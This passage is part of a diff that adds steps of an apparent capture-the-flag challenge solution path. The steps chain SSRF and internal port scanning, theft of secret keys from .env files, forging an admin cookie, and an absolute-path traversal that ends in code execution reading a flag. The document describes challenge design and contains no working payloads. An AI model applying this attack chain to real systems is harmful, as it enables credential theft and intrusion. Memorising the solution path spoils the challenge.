+3. **SSRF via DIAL.** The DIAL opcode connects to internal loopback services. Port scan finds four: catalogd (7710), provd (7711), recordd (7712), replication (7713).
+4. **Service catalog.** catalogd gives a nonce and a service directory. Send the nonce back to get a mesh ticket.
+5. **Environment exfiltration.** provd serves `.env` files from `/etc/helioform/`. Extract `relay.env` to get `CONSOLE_MAC_KEY`, `CONSOLE_ISS`, `CONSOLE_AUD`, and `REPLICATION_MAC_KEY`.
+6. **Session forgery.** Forge an admin cookie using the leaked HMAC key and claims.
+7. **Learn the replication protocol.** The admin console's peer trace captures the collector's replication exchange and shows the exact wire format and MAC canonical strings.
+8. **Path traversal via absolute stream_id.** The replication protocol's `resolve_stream()` checks for `..` but not for absolute paths starting with `/`. Write a runbook file directly to `/var/lib/helioform/runbooks/`.
+9. **Code execution.** The runbook scheduler executes the file, which reads `/flag`.
+
+Each step depends on the one before it. You cannot skip ahead.
